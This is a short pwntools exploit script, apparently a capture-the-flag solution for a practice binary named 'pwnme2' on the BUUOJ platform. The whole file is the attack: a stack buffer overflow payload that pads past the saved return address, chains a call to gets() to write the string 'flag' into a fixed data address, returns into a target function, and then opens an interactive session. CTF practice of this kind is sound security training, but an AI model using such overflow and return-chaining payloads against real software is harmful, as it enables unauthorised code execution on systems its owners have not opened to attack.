from pwn import *

context(log_level='debug')

io=process("./pwnme2")
#io=remote("node3.buuoj.cn",25706)
elf=ELF("./pwnme2")

io.recv()

gets_plt=elf.plt['gets']
#puts_got=elf.got['puts']

main=0x80486f8

#pop_rdi_ret=0x400733

string=0x804A060

ret=0x80483f2
func=0x80485cb
payload=b'A'*(0x6c+0x4)+p32(gets_plt)+p32(func)+p32(string)

io.sendline(payload)

#io.recv()

io.sendline(b'flag\x00')

io.recv()

#func=0x80485cb

#payload=b'A'*(0x6c+0x4)+p32(func)

#io.sendline(payload)

io.interactive()